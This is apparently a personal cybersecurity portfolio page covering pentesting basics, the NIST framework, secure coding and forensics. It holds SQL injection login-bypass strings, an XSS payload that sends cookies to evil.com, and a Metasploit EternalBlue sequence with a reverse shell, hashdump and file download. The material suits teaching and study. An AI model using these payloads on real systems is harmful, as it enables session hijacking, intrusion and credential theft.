---
layout: default
---


[Link to another page](https://freightr.app/).

# Cybersecurity Skills Portfolio

Welcome to my cybersecurity skills portfolio. Here you'll find demonstrations, code samples, and explanations of a wide range of cyber skills, from ethical hacking to secure coding and digital forensics.

## Penetration Testing

> Penetration testing (pentesting) is the practice of simulating cyberattacks to identify vulnerabilities in systems and applications.
> "The best defense is a good offense."

### NIST Cybersecurity Framework

The NIST Cybersecurity Framework consists of five core functions:

#### 1. Identify
- Asset Management
- Business Environment Analysis 
- Governance
- Risk Assessment
- Risk Management Strategy

#### 2. Protect
- Access Control
- Awareness and Training
- Data Security
- Information Protection
- Protective Technology
- Maintenance

#### 3. Detect
- Anomalies and Events
- Security Continuous Monitoring
- Detection Processes

#### 4. Respond
- Response Planning
- Communications
- Analysis
- Mitigation
- Improvements

#### 5. Recover
- Recovery Planning
- Improvements
- Communications

Each function plays a critical role in managing cybersecurity risk:

- **Identify**: Develop organizational understanding to manage cybersecurity risk
- **Protect**: Implement appropriate safeguards to ensure delivery of services
- **Detect**: Implement appropriate activities to identify cybersecurity events
- **Respond**: Implement appropriate activities to take action regarding detected events
- **Recover**: Implement appropriate activities to maintain resilience and restore capabilities

### Example: Simple Port Scanner in Python

```python
import socket

target = '127.0.0.1'
for port in range(20, 1024):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} is open")
    s.close()
```

### Example: SQL Injection Test

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password';
```
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'anything';
```
### Example: Cross Side Scripting

#### 1. Basic Script Injection (Reflected XSS)
```html
<script>alert('XSS Attack!');</script>
```
If a web application reflects user input directly into the page without sanitization, an attacker can inject this script to display an alert box.

#### 2. Cookie Theft via XSS
```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie);</script>
```
This attack sends the victim's cookies to a malicious server, potentially allowing the attacker to hijack the user's session.

#### Common Pentesting Tools

*  Nmap
*   Network Scanning:
    ```bash
    # Basic scan
    nmap 192.168.1.0/24
    
    # Service version detection
    nmap -sV 192.168.1.1
    
    # OS detection
    nmap -O 192.168.1.1
    
    # Aggressive scan (versions, scripts, traceroute, OS)
    nmap -A 192.168.1.1
    
    # Stealth SYN scan
    nmap -sS 192.168.1.1
    
    # UDP scan
    nmap -sU 192.168.1.1
    
    # Specific port scan
    nmap -p 80,443 192.168.1.1
    ```

*   Script Scanning:
    ```bash
    # Run default scripts
    nmap -sC 192.168.1.1
    
    # Vulnerability scanning
    nmap --script vuln 192.168.1.1
    
    # SSL/TLS scanning
    nmap --script ssl-enum-ciphers -p 443 192.168.1.1
    ```

*   Output Options:
    ```bash
    # Save to file
    nmap -oN output.txt 192.168.1.1
    
    # XML output
    nmap -oX scan.xml 192.168.1.1
    
    # All output formats
    nmap -oA scan_results 192.168.1.1
    ```

*  Metasploit
*   Basic Usage:
    ```bash
    # Start Metasploit console
    msfconsole
    
    # Search for exploits
    search ms17-010
    
    # Use specific exploit
    use exploit/windows/smb/ms17_010_eternalblue
    
    # Set required options
    set RHOSTS 192.168.1.1
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.2
    
    # Run the exploit
    exploit
    ```

*   Post-Exploitation:
    ```bash
    # After getting meterpreter shell
    
    # System information
    sysinfo
    
    # Get user privileges
    getuid
    
    # Dump password hashes
    hashdump
    
    # Upload/download files
    upload /path/to/file
    download /remote/path/file
    
    # Navigate filesystem
    cd /path
    ls
    pwd
    ```

* Burp Suite
*   Basic Usage:
    ```bash
    # Start Burp Suite
    burpsuite
    
    # Common Operations:
    # Configure proxy settings (default: 127.0.0.1:8080)
    # Intercept requests
    # Send to repeater
    # Use scanner for vulnerabilities
    ```

*   Advanced Features:
    ```bash
    # Start Burp Suite in headless mode
    java -jar burpsuite_pro.jar --headless
    
    # Using Burp REST API
    curl -X POST -H "Content-Type: application/json" \
    --data '{"scan": true}' \
    http://localhost:1337/v0.1/scan
    ```

*   Wireshark
*   Basic Usage:
    ```bash
    # Start packet capture on interface eth0
    wireshark -i eth0
    ```


##### Pentesting Process

1.  Reconnaissance
2.  Scanning
3.  Exploitation
4.  Post-Exploitation
5.  Reporting

###### Example Vulnerability Table

| Vulnerability   | Severity | Description                |
|:---------------|:--------:|:---------------------------|
| SQL Injection  | High     | User input not sanitized   |
| XSS            | Medium   | Reflected script injection |
| Open Port      | Low      | Unnecessary service open   |

###  Example PhysicaL Security Table 

| Physical Security | Severity | Description                |
|:-----------------|:--------:|:---------------------------|
| Door Access      | High     | Unauthorized entry points  |
| CCTV Coverage    | High     | Blind spots in monitoring |
| Server Room      | Critical | Temperature control issues |
| Perimeter Fence  | Medium   | Damaged sections found    |
| Badge System     | High     | Outdated access controls  |
| Fire Protection  | Critical | Faulty sprinkler system   |


### Secure Coding Practices

*   Input validation
*   Output encoding
*   Principle of least privilege
*   Use of secure libraries

### Example: Password Hashing in Python

```python
import bcrypt

password = b"supersecret"
hashed = bcrypt.hashpw(password, bcrypt.gensalt())
print(hashed)
```

### Secure Coding Checklist

1.  Sanitize all user inputs
2.  Use parameterized queries
3.  Avoid hardcoded secrets
4.  Implement proper error handling

### Nested List: Secure Development Lifecycle

- Requirements
  - Security requirements
  - Compliance requirements
    - GDPR
    - HIPAA
- Design
  - Threat modeling
  - Secure architecture
- Implementation
  - Code reviews
  - Static analysis
- Testing
  - Dynamic analysis
  - Penetration testing
- Deployment
  - Secure configuration
  - Monitoring

### Small image

![Cybersecurity](https://upload.wikimedia.org/wikipedia/commons/4/4a/Cyber_Security_Malware.png)

### Large image

![Network Defense](https://www.csoonline.com/wp-content/uploads/2023/10/cybersecurity_network_security_shutterstock_1937225139-100876367-orig.jpg)

### Digital Forensics

<dl>
<dt>Definition</dt>
<dd>Digital forensics is the process of uncovering and interpreting electronic data.</dd>
<dt>Tools</dt>
<dd>Autopsy, FTK, EnCase</dd>
<dt>Process</dt>
<dd>Acquisition, Analysis, Reporting</dd>
</dl>

```
# Example: Extracting metadata from a file using exiftool
exiftool suspicious.jpg
```

```
# Example: Hashing a file for integrity
sha256sum important.docx
```

### Cybersecurity Certifications

* CompTIA Security+
* Certified Ethical Hacker (CEH)
* Offensive Security Certified Professional (OSCP)
* GIAC Security Essentials (GSEC)

### The final element: Stay curious, keep learning, and always practice ethical hacking!
